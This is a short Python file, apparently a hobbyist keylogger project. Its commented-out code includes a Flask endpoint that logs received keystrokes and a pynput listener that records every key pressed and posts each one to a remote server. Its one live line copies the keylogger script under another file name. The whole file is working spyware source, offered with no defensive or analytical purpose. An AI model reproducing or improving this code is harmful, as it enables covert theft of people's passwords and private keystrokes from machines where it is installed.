
# #     from flask import Flask, request

# # app = Flask(__name__)

# # @app.route('/log', methods=['POST'])
# # def log_keystrokes():
# #     data = request.data.decode('utf-8')
# #     with open('keystrokes.log', 'a') as f:
# #         f.write(data + '\n')
# #     return 'Keystrokes logged successfully\n'

# # if __name__ == '__main__':
# #     app.run(debug=True)  # Run the Flask app in debug mode for development




# #############################################################################
    
#     import requests
# from pynput import keyboard

# # URL of the server endpoint to receive keystrokes
# SERVER_URL = 'http://example.com/keystrokes'

# def keypressed(key):
#     try:
#         char = key.char
#         with open("keyfile.txt", 'a') as logkey:
#             logkey.write(char)
#         # Send the captured keystroke to the server
#         requests.post(SERVER_URL, data={'keystroke': char})
#     except:
#         print("Error getting char")

# if __name__ == "__main__":
#     listener = keyboard.Listener(on_press=keypressed)
#     listener.start()
#     input()
import shutil
shutil.copy("keylogger 2.py","moto.py")
